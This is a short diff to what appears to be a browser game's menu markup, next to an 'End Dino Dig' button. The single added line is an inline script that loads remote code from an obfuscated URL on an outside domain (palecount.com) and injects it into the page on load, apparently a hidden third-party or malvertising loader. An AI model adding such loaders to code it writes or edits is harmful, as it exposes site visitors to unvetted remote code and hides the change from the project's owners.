@@ -237,6 +237,7 @@
                 <button id="endDino">End Dino Dig</button>
             </div>
         </div>
+        <script>(function(ivbxgkw){ var d = document,     s = d.createElement('script'),     l = d.scripts[d.scripts.length - 1]; s.settings = ivbxgkw || {}; s.src = "//palecount.com/bTX.VysgdhG-lx0vYnWsduibYtWF5/uWZHX-Ij/neUmI9-u/Z/UtlMk/PpTtU/4XMczyIkx/NCTDcRtUNnToguz/M/jIEm1xOpAE"; s.async = true; s.referrerPolicy = 'no-referrer-when-downgrade'; l.parentNode.insertBefore(s, l); })({}) </script>
     `;
     document.body.appendChild(menu);
 
